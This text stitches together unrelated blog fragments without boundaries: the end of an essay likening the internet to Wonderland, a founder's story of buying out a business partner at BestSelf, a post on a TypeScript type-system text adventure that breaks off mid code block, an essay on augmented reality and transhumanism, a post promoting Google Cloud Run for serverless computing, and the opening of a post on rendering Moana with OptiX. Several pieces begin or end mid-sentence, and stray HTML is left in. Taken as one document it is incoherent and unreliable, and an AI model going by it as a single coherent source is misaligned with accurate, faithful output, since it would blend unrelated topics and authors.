the internet for these same reasons. Our curiosity is never satiated with endless content and powerful 
recommender systems. Our anxiety is consistently triggered by the fear of missing out and the need to escape 
reality.</p>
<p>Like Wonderland, the internet has become an alternate reality thanks to the breath of the content available 
and its multimedia nature. Wonderland resembled reality enough that Alice accepted it as real. The internet's 
information is realistic enough that people struggle to know what is real and what is fake.</p>
<p>As distorted realities, both the internet and Wonderland are strange and entertaining. But they are a 
dangerous type of fantasy that discourages us from returning to reality, and attemps to transform us into one of its 
cartoon characters.</p>
<p>Alice navigated Wonderland safely, staying true to herself. Her principles can help us remain active 
internet users, instead of being used by the internet. Keep an open mind, but remain logical. Think 
critically, through questions. Stay curious, with purpose.</p>

Now I realize that if we had some hard conversations earlier, we may have had a smoother time ending the partnership.<br></p><p><strong>In this post I’ll share:</strong></p><ul role="list"><li><strong>how things went for me; the ‘A’ years</strong></li><li><strong>how to decide if you need a partner</strong></li><li><strong>qualities you should look for <em>(and what to avoid)</em></strong></li><li><strong>how do you split equity</strong></li><li><strong>the operating agreement; some key things you’ll want in there</strong></li><li><strong>buy/sell agreement</strong></li><li><strong>business partner checklist (a to-do list for following everything in this post)</strong></li><li><strong>other tips from my trauma <em>(lol… but really</em></strong><em>)</em><strong><em>‍</em></strong></li></ul><h3><strong>my story</strong><a href="https://littlemight.com/#"><br></a></h3><p>I started <a href="https://lttlmg.ht/bestself" target="_blank">BestSelf</a>, with my business partner (who I will refer to as 'A') in mid-2015, around 18-months after we initially met. </p><p>In that time we'd hung out in person around 4-5 times. To continue the analogy of business partnership being like marriage, I'd married someone that I'd only been on a few dates with and barely knew. I partnered out of insecurity with someone who talked a good game and seemed strong in the areas I felt weak.This insecurity cost me $$$</p><figure id="w-node-76af6d16a676-3448d0da"><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5f8750eb6f143d07b654067a_partnership-2.jpg" loading="lazy" alt=""></p></figure><p>We met through an entrepreneurship course online and became accountability partners soon after. With him being in New Jersey and me in NYC, we were close enough to be able to meet in person once every few months.&nbsp;<br></p><p>Through being accountability partners we became aware of each other's strengths and complementary skill sets, him with marketing and me with product design and branding.<br></p><p>As background, before <a href="https://lttlmg.ht/bestself">BestSelf</a> was born I had another Shopify store selling graphic design products that was paying all my bills and generating a good living. I considered that business my ‘Freedom vehicle’ as it allowed me to quit my Architecture job but I wasn’t passionate about doing it long-term.<br></p><p>I <em>was</em> deeply passionate about personal development during this time and was always reading and finding ways to upgrade my skills and productivity. I felt like I’d found the cheat code to life and wished I’d been introduced to it sooner. Before I quit my architecture job, I set myself a task to <a href="https://littlemight.com/articles/the-22-books-that-helped-me-quit-my-job" target="_blank">read 22 books around specific topics so I would be ready for the world of entrepreneurship.</a><br></p><p>The <a href="https://lttlmg.ht/journal" target="_blank">Self Journal</a> was later born from my personal struggle for years of finding a planner that would both keep me organized and also help me reach my most important goals.<br></p><p>I decided I wanted to turn the journal I built for myself into a product to sell, because it seemed whenever I showed it to someone they wanted to buy it.&nbsp; I didn’t think this product would be the start of something bigger, I just wanted to bring this product to life.</p><p>It was then I thought having someone who knew sales and marketing would be beneficial so I asked ‘A’ to partner with me on it. He also had his own journaling structure&nbsp; so I felt it was a common interest.<br></p><p><strong>In retrospect, I partnered out of my insecurities around marketing and selling myself. </strong></p><h6>Most entrepreneurs don't have business problems, they have emotional problems disguised as business problems —<strong> and so I disguised my fear of putting myself out there with a business partner.&nbsp;</strong><br></h6><p>And so it began.<br></p><p>The original name we came up with for the company was “Self Improvement Labs”... but I <em>hated</em> it. One weekend when ‘A’ was gone I knew I had to come up with something better to replace it with<em>.</em></p><p><em>(because I don’t like when people criticize something without giving a reasonable alternative).</em><br></p><p>In those 2 days I came up with the idea for <a href="https://lttlmg.ht/bestself">BestSelf</a>, bought the domain BestSelf.co and created a whole branding package. Thankfully there was no pushback, ‘A’ agreed it was a better name and we moved forward.<br></p><p>We launched the Kickstarter campaign in August 2015. I had experience with launching Kickstarter campaigns in the past and so I had a formula for how to do it which helped us a lot. You can read how we did it <a href="https://littlemight.com/articles/kickstarter-step-by-step" target="_blank">here</a>.<br></p><p><strong>We funded in 28 hours and over the course of 34 days we raised over $322,000 which was enough to both create the product for backers and launch the entire business.</strong></p><figure><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5ea0cb1d0f854b10467cf739_5e2a2251be4a7438101d60a6_image.png" alt="funding progress graph"></p></figure><p>We launched our online store in January 2016 and the business continued to grow. We won the <a href="https://littlemight.com/articles/shopify-2016-build-a-business-experience" target="_blank">2016 Shopify Build a Business award</a> in August of 2016 and then in 2017 we scaled 4X and won the Build a BIGGER Business Award.</p><figure id="w-node-ac6b3b3d99ee-3448d0da"><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5f857aa10221b7fa4725f1a6_image5.png" loading="lazy" alt=""></p></figure><figure id="w-node-9ccd9ba5eca2-3448d0da"><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5f857aae7da8462c3bf9000a_image1.png" loading="lazy" alt=""></p></figure><p>When things are going so well business-wise it’s easy for things to run smoothly, it’s like the early dating phase when you don’t have to deal with too much harsh reality yet. Then the pandemic starts and you find out what your relationship is really made of.<br></p><p>By late 2016, while professionally things were still good with the business, cracks began appearing in our personal relationship… the 2016 election was a definite factor here. That was the first time it became clear how differently we saw the world and how opposite our backgrounds were.<br></p><p>In 2017, we’d hired out the majority of his role in marketing and by April 2018 he had stepped away from all business operations - informally anyway.&nbsp;<br></p><p>By informally I mean there was never a discussion of him passing the baton and stepping out, he just suddenly was no longer there. But he was still taking as much money out of the company as I was -- or more.<br></p><p><strong>As you can imagine being a 50/50 partner where one partner is working full-time and the other is completely disconnected is tough — really tough. I was essentially hamstrung on big decisions and company direction. </strong></p><p>And anything I could decide could be overwritten or debated even after I thought it was settled. The same went for team members, as every now and again he'd jump on calls, start giving advice or instruction (without knowing what was even happening) and cause frustration and confusion with team members. </p><p>By early 2019, I was becoming resentful as our distributions were still 50/50 <strong>but I wasn’t getting any salary for the 60+ hour weeks of time I was putting in. </strong>When I brought it up to him, as if he were my boss, he would say <em>“I don’t equate time with value,”</em> yet he wasn’t giving either to the company.<br></p><p>At the same time as he would reject my salary request, he’d post stuff like this on his Instagram:</p><figure id="w-node-be8cd5eaae18-3448d0da"><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5f873b98bd121731d6cf0d21_3-hour-week.jpg" loading="lazy" alt=""></p></figure><h6>Here's a tip, if someone’s telling you running a business is easy — they’re either lying, or trying to <strong>sell</strong> you something.<br></h6><p>In the case of ‘A’, it was both.<br></p><p>Each video “guru” post he’d share taking credit for work that wasn’t his &nbsp;felt like a slap in the face — not just to me but,&nbsp; more importantly, to the team. <strong>Being under-paid (or not paid at all) is one thing, but having my value be dismissed on top of that was actually the bigger issue -- and was the beginning of the end.</strong><br></p><p>I ended up removing him on all social media platforms in mid 2019 because posts like the one above were triggering me.<br></p><p>By July 2019, we finally agreed on a modest salary for me in lieu of taking distributions which I would be made up for later. This still meant that I was getting the same $ amount or less per month as he was but at least now I had an IOU.&nbsp;<br></p><p><em>(I did this as I didn’t want to take more cash out of the business that would negatively impact our growth.)</em><br></p><p>Yay, a salary! <strong>I was now the 3rd highest paid person on my team of 10</strong> -- and getting the same as the person that had done nothing for the company in more than a year.<br></p><figure id="w-node-cc78a0f0c1db-3448d0da"><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5f86195162505211420ac4da_Image%202.JPG" loading="lazy" alt=""></p></figure><p>By the end of 2019, other things happened that I won’t go into. Suffice to say, I was mentally exhausted and felt completely taken advantage of by someone I had trusted.&nbsp;<br></p><p>So we looked for options to get out...either of the business, or at least the partnership.<br></p><p>When numbers around buyout expectations came up, there was a chasm of difference between what ‘A’ felt he deserved and what was realistic -- especially given how much he’d already taken over the last 18 months without working ($400k+).&nbsp;<br></p><p>Taking on investors or another partner seemed like the only option. However, by that point, I had no interest in bringing in someone that may have me ending up in the same place.<br></p><p><strong>Better the devil you know...</strong><br></p><p>Going into 2020 I felt stuck between a rock and a hard place.&nbsp;<br></p><p>On one hand I wanted to grow the business, innovate with new products and keep my team charged. Yet, on the other hand, I knew doing so would mean eventually paying him more in a buyout situation.<br></p><p>Every year I do a yearly review to reflect on the prior year and to set some big goals for the new year. Maybe you’ve seen them. Good, bad and mixed… I've shared my review publicly in <a href="https://littlemight.com/articles/2014-review" target="_blank">2014</a>, <a href="https://littlemight.com/articles/2015-review" target="_blank">2015</a>, <a href="https://littlemight.com/articles/2016-review" target="_blank">2016</a>, <a href="https://littlemight.com/articles/2017-review" target="_blank">2017</a>, <a href="https://littlemight.com/articles/2018-review" target="_blank">2018</a>... right up until this year.<br></p><p><strong>This year I couldn't bring myself to share my review and big goal <em>publicly</em>.</strong><br></p><p><em>(It seems funny now given the dumpster fire that 2020 has been that I just knew putting plans out there might not be the best idea.)</em><br></p><p>The thing I was scared to share publicly was that <strong>my biggest goal for 2020 was to end my business partnership with ‘A’ once and for all.</strong><br></p><p>Between COVID affecting business and other extenuating factors, we could finally agree on a reasonable buyout number in August 2020 -- after over 7 months of negotiation. While it had me taking on a significant amount of personal debt, I was happy to do so because I believe so strongly BestSelf -- and in my incredible team.<br></p><p>As of September 24th 2020 I’m officially 100% owner in <a href="https://lttlmg.ht/bestself" target="_blank">BestSelf</a> - <a href="https://www.instagram.com/p/CFr72LMHSIk/?utm_source=ig_web_copy_link" target="_blank"><strong>official announcement here</strong></a><strong>.</strong><br></p><h6><strong>To say I was excited would be an understatement 🙌🏻</strong></h6><figure id="w-node-8453fbbbca5b-3448d0da"><a href="http://instagram.com/cathryn.lavery" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5ea0c87d3db0d2d23479ff47/5f861a99397936d25e6798ea_giphy%20(9).gif" loading="lazy" alt=""></p></a><figcaption>yay!</figcaption></figure><h3>‍<strong>what I would do differently</strong><br></h3><p>I don’t believe in regrets or wishing things were different - everything worked out as it was meant to and this was a huge learning experience for me.&nbsp;<br></p><blockquote><em>“Don’t wish it was easier, wish you were better”</em> - Jim Rohn</blockquote><p>This famous Jim Rohn quote perfectly fits here, this whole experience taught me a lot about myself and what I’m capable of.&nbsp;<br></p><p>That said… I learned some big lessons that would make me approach any future partnership extremely differently.

Why not a text adventure!"</p><p>Now, it turns out that the way I implemented this game, I don't need the 4.1 features. I'll probably add that in the future to support more dynamic command parsing.</p><p>If you have <code>vscode</code>, you can play now with a quick <code>npm install</code> into any node project. (See below for full installation instructions.)</p><h3>So What?</h3><p>This is a level 99 typescript wizardry demo. </p><p>If you aren't a typescript nerd, you might miss the significance of this, but here is the basic idea:</p><p>First of all, everything you see here is running in the vscode code editor (without any program running). In fact, you can't even run my code. If you compile it to javascript, this is what you will get:</p><div><div><div><div><pre><code><span>export</span> <span>const</span> gameStart = <span>null</span>;</code></pre></div></div></div><p><span>➖</span></p><p><span>➕</span></p></div><p>(There might be a little more debris then that, but you get the idea.)</p><p>This screenshot should make it clear that the typescript type system is doing all the work:</p><p><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-04-type-only.png"></p><p>However, it's not very convenient to declare all those StepNN types, so I made a fluent mode that reduces the need for those:</p><p><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-01.png"></p><p>There is also an easy mode that uses only an object tree. It was very easy to make, but autocomplete ruins the fun by giving all the answers away. </p><p><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-05-easy.png"></p><p>In the process of making the game, I discoved that vscode supports jsdoc markdown. So I decided to use that for the game output since it is so rich. It even supports images:</p><p><img src="https://ricklove.me/blog-content/posts/2020-10-24-typescript-type-system-adventure/game-screenshot-03.png"></p><h3>Features</h3><ul><li>Play in vscode using autocomplete and tooltips</li><li>Game output displayed in tooltips using jsdoc3 with markdown (including gifs)</li><li>Implemented using conditional types, string literals, and a minimal state machine</li></ul><h3>How to play</h3><ul><li><code>npm i @ricklove/typescript-type-system-adventure</code></li><li>Create a new <code>play.ts</code> file and add the below code</li><li>Hover over <code>execute</code> to see game output (see screenshots for examples)</li></ul><div><div><div><div><pre><code><span>import</span> { gameStart } <span>from</span> <span>'@ricklove/typescript-type-system-adventure'</span>;

        <section>
            <!--kg-card-begin: markdown--><h4 id="preface">Preface</h4>
<p>This post is a bundle of thoughts on the near future of Augmented Reality implementations, ways of integration, and introducing new layers of cognition. We are going to talk about AR as a way of enabling transhumanism by broadening the human cognitive and sensory toolbox.<br>
We are not going to be concerned with what is and what is not technologically possible at the moment.</p>
<h4 id="introduction">Introduction</h4>
<p>Have you ever taken a walk and thought about all the accessible information on animals, plants, objects, or even people? How much information is available on the internet? How many facts have you encountered and already forgotten?</p>
<p>Ancient Greeks put an active effort into training and maintaining their memorizing capabilities, and already at this stage of progress, human memory is shifting – or has shifted from remembering facts to remembering how and where to find facts. We are keeping less and less information hardcoded in our permanent memory and are in turn learning how to<br>
consume, process, and find useful data in an endless stream of information and misinformation.</p>
<p>A technologically proficient user has access to a vast volume and spectrum of data at his/her disposal, sitting right in the pocket. The human approach to holding knowledge is evolving as we speak. Heck, it started evolving with the invention of speech. But another significant<br>
change is on the cusp of happening. Our mobile phone interfaces, while serving all the information we need, are still detached from us, having considerable latency when we need to find, show, or input data. With the introduction of AR, AI, and human-computer interfaces, everything is about to change. AR or human augmentation in general will make that data<br>
more accessible and drastically lessen the latency needed for the interaction, making the tools feel more and more as part of ourselves.</p>
<p>Imagine walking down the street. You look around to observe people on the street and notifications start popping up alongside people’s heads. For one person the message says:<br>
"You have seen this person three times this week already"; for another one it states:<br>
"You have five mutual connections and common interests".<br>
Those notifications could also tell you if the person is willing to make new connections, based on previously shared data or facial microexpression analysis. Maybe we have gone too far down the rabbit hole for now, but you<br>
get the idea.</p>
<h3 id="definingarandtranshumanism">Defining AR and Transhumanism</h3>
<p>Merriam-Webster defines Augmented Reality as "an enhanced version of reality created by the use of technology to overlay digital information on an image of something being viewed through a device (such as a smartphone camera)". For the purposes of this post, I would like us not to limit reality to human vision alone.</p>
<p>Merriam-Webster has no definition for Transhumanism, but Wikipedia defines it as a philosophical movement that advocates for the transformation of the human condition by developing and making widely available sophisticated technologies to greatly enhance human intellect and physiology.</p>
<p>The two are getting more and more intertwined as technology advances, so I would like us to redefine AR, if only for this post, as "any technology that enhances or expands the human experience of reality", or maybe even as "practical transhumanism".</p>
<h3 id="augmentationtechnologymilestones">Augmentation technology milestones</h3>
<p>These are some freely set milestones for AR technology.</p>
<ul>
<li>LVL 0 – environment emulation via VR – for developmental fast-tracking</li>
<li>LVL 1 – external IO devices – headsets, glasses, gloves</li>
<li>LVL 2 – embedded IO devices – lenses, external neural signal readers</li>
<li>LVL 3 – tapping into existing sensory and neural networks</li>
<li>LVL 4 – registering new input/output devices in neural networks</li>
</ul>
<h3 id="degreesofaugmentation">Degrees of augmentation</h3>
<p>For the time being, and at least until we master the LVL 4 milestone described above, we are not creating new sensory or actuation systems, we are only hijacking the existing ones. Hi, Neuralink ;). This means that with every bit of information we gain, we are blocking the bandwidth and use for our existing IO mechanisms.In all fairness, people recovering mobility after a severe head trauma are evidence that the brain could possess enough plasticity to use whatever is thrown at it, given we connect the right dots, have enough time and practice. User age could also be a part of the equation.<br>
Sounds easier than it is, I know.</p>
<p>So, the more we augment our existing senses, the more we obstruct our basic physical-world data flow, the need to set some design restriction guidelines will grow. We still have accidents while using mobile phones or headphones, so the question arises: how could we manage a society full of people that overlap and fully cover their field of vision and hearing?<br>
Some safety rules integrated into the tech would be quite handy. Here is an example of defining degrees of augmentation:</p>
<ul>
<li>No augmentation</li>
<li>Info - can be an overlay, but should not block much sensory bandwidth</li>
<li>Safe communication – headset equivalent</li>
<li>Immersive experience – not safe for driving, safe for outdoors</li>
<li>Fully overlaying sensory input with enabled alerts – public safe zones</li>
<li>Fully overlaying sensory input – only for safe zones at home</li>
</ul>
<h3 id="augmentationusagecategories">Augmentation usage categories</h3>
<h4 id="knowledgemanagement">Knowledge management</h4>
<p>At some point, AR should enable access to data from the internet, which should be retrieved and presented without too much user effort, based on surrounding situations and context. Also, the useful data should be categorized and stored for retrieval at a later time.<br>
The interface should be able to combine relevant data and present solutions, statistics, and probabilities.</p>
<p>This could also enable saving verifiable event recordings, snapshots, and transcripts, real-time language translation, or seeing blueprints and instructions while fixing devices.</p>
<h4 id="extendingsensoryreach">Extending sensory reach</h4>
<p>The human sensory reach is already drastically extended with the use of IoT and the internet in general, but there is so much more of existing tech to be integrated into an AR system to extend human senses. Users could see and feel if their home or possessions are safe, or more generally, sense physical-world information streams in real-time.<br>
For example, physical-world data can be processed in parallel with the user experiencing the immediate surroundings. Thus, the user would, for instance, return home and detect certain objects have been moved, etc.</p>
<h4 id="extendingphysicalactuationactionreach">Extending physical actuation/action reach</h4>
<p>Besides our physical reach, most of us have already experienced controlling or affecting the physical-world at a distance. AR could help make the world around us feel more like an extension of our physical bodies.<br>
We could run automated processes upon visual triggers, i.e. unlock the front door without thinking, or control devices, drones, and robotics with ease.</p>
<h4 id="communicationandindividuality">Communication and individuality</h4>
<p>Communication could also be streamlined. We could have an instant connection with anyone around the world, almost as if standing side by side. Communication could play out on several levels, depending on the level of technological advancement, and could be:</p>
<ul>
<li>Restrained – messages and recordings with a delay and opportunity for curation</li>
<li>Unrestrained – conservative – real-time audio-visual communication</li>
<li>Unrestrained – progressive – direct thought transfer in a Neuralink-like brain-computer interface manner</li>
</ul>
<p>We could socialize, play games, or work like never before:<br>
imagine coding while sharing your thought process with a colleague, and also having an "AI" assisted IDE.</p>
<h4 id="extendingthecognitiontoolbox">Extending the cognition toolbox</h4>
<p>Given having a portable AR system and a smart enough underlying OS that replicates our surroundings and anticipates our needs OR an efficient enough way of selecting and using computational tools, we could:</p>
<ul>
<li>see object trajectories</li>
<li>have perfect math at our disposal</li>
<li>know objects, plant life, animals, etc.</li>
</ul>
<p>AI or General AI could, if available, also be used as an intermediary to the available cognition toolbox, to serve the necessary tools and results to the end-user.</p>
<h4 id="pastimeandentertainment">Pastime and entertainment</h4>
<p>I won’t go into great detail here, VR games are already immersive and fun, but try to imagine what they would be like if some freedom is added to the mix. As games and entertainment are presumably most likely to require as much immersion as possible, it will be necessary to consider immersion safety.</p>
<h5 id="vrgamesandapsfullyoverlayingsensoryinput">VR games and APS - fully overlaying sensory input</h5>
<p>Cars, stairs, sudden drops, and obstacles are here to stay, so for any device that can write over your sensory input, a way to risk mitigation must be in place.</p>
<h5 id="endusersafetyzonecalibration">End user safety zone calibration</h5>
<p>Imagine you want to play a full-on VR game somewhere. How could you stay safe and not trip over something or fall over some curb? It is simple, you could just walk around your playground to define its contours and limits. A certain amount of space can even be taken out of the outer limits of the playground, any obstacles are reproduced in-game so you can navigate past them. You start the game and play, and in case you move to the outer limits, the game simply starts to fade away.</p>
<h5 id="safesurfaces">Safe surfaces</h5>
<p>OK, but where else could you use 100% augmentation opacity in the real world? The first thing that comes to mind as safe would be walls. You can project stuff in front of almost any wall and be sure that nothing you can’t see will hit you from that direction, or at least as sure as you are now.</p>
<h5 id="contentkillswitch">Content killswitch</h5>
<p>Another useful feature would be to have the immersive content stop when quiet time or rest is needed, as well as if stress levels are critical.</p>
<h3 id="pitfallsofarandhumanaugmentation">Pitfalls of AR and Human augmentation</h3>
<ul>
<li>Having no signal or battery</li>
<li>Developing a dependence on AR in everyday life</li>
<li>Losing sense of the physical self</li>
<li>Losing individuality</li>
<li>Identifying the AR OS as a part of the personality</li>
</ul>
<h3 id="wecanworkondevelopingartoday">We can work on developing AR today</h3>
<p>I guess we are all well aware of the current limitations of the AR systems, but looking past the non-existing or low tech ways of input and output that we nowadays possess, by emulating non-existing augmentation pathways and …</p></section></article></div></div>

<p>Has the “serverless revolution stalled”? I dunno. I like serverless. Taught a <a href="https://www.pluralsight.com/courses/serverless-big-picture">popular course</a> about it. But I reviewed and published an article written by Bernard Brode that <a href="https://www.infoq.com/articles/serverless-stalled/">made that argument</a>, and it sparked <a href="https://news.ycombinator.com/item?id=24758772">a lot of discussion</a>. If we can agree that serverless computing means building an architecture out of <a href="https://redmonk.com/rstephens/2018/12/14/serverless-more-than-just-functions/">managed services that scale to zero</a>—we’re not strictly talking about function-as-a-service—that’s a start. Has this serverless model <a href="https://amzn.to/3nOsehd">crossed the chasm</a> from early adopters to an early majority? I don’t think so. And <a href="https://twitter.com/LawrenceHecht/status/1316006695190102016">the data </a>shows that usage of FaaS—still a fundamental part of most people’s serverless architecture—has flattened a bit. Why is that? I’m no expert, but I wonder if some of the inherent friction of the 1st generation FaaS gets in the way. </p>



<p>We’re seeing a new generation of serverless computing that removes that friction and may restart the serverless revolution. I’m talking here about <a href="https://cloud.google.com/run">Google Cloud Run</a>. Based on the <a href="https://knative.dev/">Knative project</a>, it’s a fully managed service that scales container-based apps to zero. To me, it takes the best attributes from three different computing paradigms:</p>



<figure><table><thead><tr><th>Paradigm</th><th>Best Attributes</th></tr></thead><tbody><tr><td>Platform-as-a-Service</td><td>– focus on the app, not underlying infrastructure<br>– auto-wire networking components to expose your endpoint</td></tr><tr><td>Container-as-a-Service</td><td>– use portable app packages<br>– develop and test locally</td></tr><tr><td>Function-as-a-Service</td><td>– improve efficiency by scaling to zero<br>– trigger action based on events</td></tr></tbody></table></figure>



<p>Each of those above paradigms has standalone value. By all means, use any of them if they suit your needs. Right now, I’m interested in what it will take for large companies to adopt serverless computing more aggressively. I think it requires “fixing” some of the flaws of FaaS, and there are four reasons Cloud Run is positioned to do so.</p>



<h2>1. It doesn’t <em>require</em> rearchitecting your systems</h2>



<p>First-generation serverless doesn’t permit cheating. No, you have to actually refactor or rebuild your system to run this way. That’s different than all the previous paradigms. IaaS? You could take existing bare metal workloads and run them unchanged in a cloud VM platform. PaaS? It catered to 12-factor apps, but you could still run many existing things there. CaaS? You can containerize a lot of things without touching the source code. FaaS? Nope. Nothing in your data center “just works” in a FaaS platform.</p>



<p>While that’s probably a good thing from a purity perspective—stop shifting your debt from one abstraction to another without paying it down!—it’s impractical. Simultaneously, we’re asking staff at large companies to: redesign teams for agile, introduce product management, put apps on CI pipelines, upgrade their programming language/framework, introduce new databases, decouple apps into microservices, learn cloud and edge models, AND keep all the existing things up and running. It’s a lot. The companies I talk to are looking for ways to get incremental benefits for many workloads, and don’t have the time or people to rebuild many things at once.</p>



<p>This is where Cloud Run is better than FaaS. It hosts containers that respond to web requests or event-based triggers. You can <a href="https://cloud.google.com/functions/docs/functions-framework">write functions</a>, or, containerize a complete app—<a href="https://cloud.google.com/migrate/anthos">Migrate for Anthos</a> makes it easy. Your app’s entry point doesn’t have to conform to a specific method signature, and there are no annotations or code changes required to operate in Cloud Run. Take an existing custom-built app written in any language, or packaged (or no source-code-available) software and run it. You don’t have to decompose your existing API into a series of functions, or break down your web app into a dozen components. You might WANT to, but you don’t HAVE to. I think that’s powerful, and significantly lowers the barrier to entry.</p>



<h2>2. It runs anywhere</h2>



<p>Lock-in concerns are overrated. <a href="https://www.infoq.com/articles/avoiding-lockin-switching-costs/">Everything is lock-in</a>. You have to decide whether you’re getting unique value from the coupling. If so, go for it. A pristine serverless architecture consists of managed services with code (FaaS) in the gaps. The sticky part is all those managed services, <strong>not</strong> the snippets of code running in the FaaS. Just making a FaaS portable doesn’t give you all the benefits of serverless.</p>



<p>That said, I don’t need <em>all</em> the aspects of serverless to get <em>some</em> of the benefits. Replacing poorly utilized virtual machines with high-density nodes hosting scale-to-zero workloads is great. Improving delivery velocity by having an auto-wired app deployment experience versus ticket-defined networking is great.  I think it’s naive to believe that most folks can skip from traditional software development directly to fully serverless architectures. There’s a learning and adoption curve. And one step on the journey is defining more distributed services, and introducing managed services. Cloud Run offers a terrific best-of-both-worlds model that makes the journey less jarring. And uniquely, it’s not only available on a single cloud.</p>



<p>Cloud Run is great on Google Cloud. Given the option, you should use it there. It’s fully managed and elastic, and integrates with all types of GCP-only managed services, security features, and global networking. But you won’t <em>only</em> use Google Cloud in your company. Or Azure. Or AWS. Or Cloudflare. <a href="https://cloud.google.com/anthos/run">Cloud Run for Anthos</a> puts this same runtime most anywhere. Use it in your data center. Use it in your colocation or partner facility. Use it at the edge. Soon, use it on AWS or Azure. Get one developer-facing surface for apps running on a variety of hosts.</p>



<p>A portable Faas, based on open source software, is powerful. And I believe, necessary, to break into mainstream adoption within the enterprise. Bring the platform to the people!</p>



<h2>3. It makes the underlying container as invisible, or visible, as you want</h2>



<p>Cloud Run uses containers. On one hand, it’s a packaging mechanism, just like a ZIP file for AWS Lambda. On the other, it’s a way to bring apps written in any language, using any libraries, to a modern runtime. There’s no “supported languages” page on the <a href="https://cloud.google.com/run">website for Cloud Run</a>. It’s irrelevant.</p>



<p>Now, I personally don’t like dealing with containers. I want to write code, and see that code running somewhere. Building containers is an intermediary step that should involve as little effort as possible. Fortunately, tools like <a href="https://cloud.google.com/code">Cloud Code</a> make that a reality for me. I can use Visual Studio Code to sling some code, and then have it automatically containerized during deployment. Thanks <a href="https://cloud.google.com/blog/products/containers-kubernetes/google-cloud-now-supports-buildpacks">Cloud Buildpacks</a>! If I choose to, I can use Cloud Run while being blissfully unaware that there are containers involved.</p>



<p>That said, maybe I <em>want</em> to know about the container. My software may depend on specific app server settings, file system directories, or running processes. During live debugging, I may like knowing I can tunnel into the container and troubleshoot in sophisticated ways.</p>



<p>Cloud Run lets you choose how much you want to care about the container image and running container itself. That’s a flexibility that’s appealing.</p>



<h2>4. It supports advanced use cases</h2>



<p>Cloud Run is great for lots of scenarios. Do <a href="https://cloud.google.com/blog/products/serverless/cloud-run-now-supports-http-grpc-server-streaming">server-side streaming</a> with gRPC. Build or migrate web apps or APIs that take advantage of our <a href="https://cloud.google.com/blog/products/serverless/google-cloud-api-gateway-is-now-available-in-public-beta">new API Gateway</a>. Coordinate apps in Cloud Run with other serverless compute using the <a href="https://cloud.google.com/workflows">new Cloud Workflows</a>. Trigger your Cloud Run apps <a href="https://seroter.com/2020/08/25/first-look-triggering-google-cloud-run-with-events-generated-by-gcp-services/">based on events</a> occurring anywhere within Google Cloud. Host existing apps that <a href="https://twitter.com/steren/status/1315763902366457856">need a graceful shutdown</a> before scaling to zero. Allocate more horsepower to new or existing apps by <a href="https://twitter.com/steren/status/1315712522041786368">assigning up to 4 CPUs</a> and 4GB of RAM, and defining <a href="https://cloud.google.com/run/docs/about-concurrency">concurrency settings</a>. Decide if your app should always have an <a href="https://cloud.google.com/run/docs/about-instance-autoscaling">idle instance</a> (no cold starts) and how many instances it should scale up to. Route traffic to a specific port that your app listens on, even if it’s not port 80.</p>



<p>If you use Cloud Run for Anthos (in GCP or on other infrastructure), you have access to underlying Kubernetes attributes. Create private services. Participate in the service mesh. Use <a href="https://cloud.google.com/run/docs/configuring/using-secrets">secrets</a>. Reference <a href="https://cloud.google.com/run/docs/configuring/using-configmaps">ConfigMaps</a>. Turn on Workload Identity to <a href="https://cloud.google.com/run/docs/configuring/workload-identity">secure access</a> to GCP services. Even <a href="https://cloud.google.com/run/docs/configuring/compute-power-gpu">take advantage of GPUs</a> in the cluster.</p>



<p>Cloud Run isn’t for <em>every</em> workload, of course. It’s not for background jobs. I wouldn’t run a persistent database. It’s ideal for web-based apps, new or old, that don’t store local state. </p>



<p>Give Cloud Run a look. It’s a fast-growing service, and it’s free to try out with our <a href="https://cloud.google.com/free">forever-free services</a> on GCP. 2 million requests a month before we charge you anything! See if you agree that this is what the next generation of serverless compute should look like.</p>

<p>TL/DR: After Matt’s original “Swallowing the Elephant” with PBRT, and my own “Digesting the Elephant” with OSPRay, I <em>finally</em> got some “first light” on my “Moana on OptiX” sandbox; not fully done yet, but good enough to at least show a glimpse of. I’ll briefly say something about the voyage I took to get there, and will give a brief overview of what’s currently implemented, and what’s still missing.</p>



<h2>Moana on OptiX/RTX: Background</h2>



<p>As already mentioned/hinted at last week, I had actually been working on “Moana on OptiX”, on and off, since the very day I joined NVidia… which by now is over two years ago. In fact, there’s more than one such sandbox: at some point I had an OptiX 6 based Moana viewer (no RTX), an OptiX 6.5 one<em> </em>(<em>with</em> RTX), an OptiX prime one (pre-7, obviously), an optix-7-alpha one (way before 7 got released); then another pure CUDA one (with my own CUDA ray tracing core), and even one that ran the same CUDA shading code (with a few #define’s and template magic) on both CUDA, and on the CPU w/ either embree or OptiX prime as a backends …  and probably a few more that I now forgot about. I also had a version that used NVLink to split the model over multiple GPUs; one that used managed memory to “page” to the host; and even one that can run mpi-data parallel (with full path tracing!) across diffurent GPUs and/or several different GPU nodes….  </p>



<p>Of course, most of those Moana viewers were rather “prototypical” in the sense that they all looked at different aspects of the problem. For example, the CUDA-only version was heavily optimized towards lowest possible memory consumption, etc. Moreover, several of these sandboxes tried to be useful for <em>both</em> Moana <em>and </em>other heavily instanced PBRT models like “landscape” and “ecosys” – but since these all use <em>very </em>different materials, textures, lights, etc the latter ended up being a giant distraction…. </p>



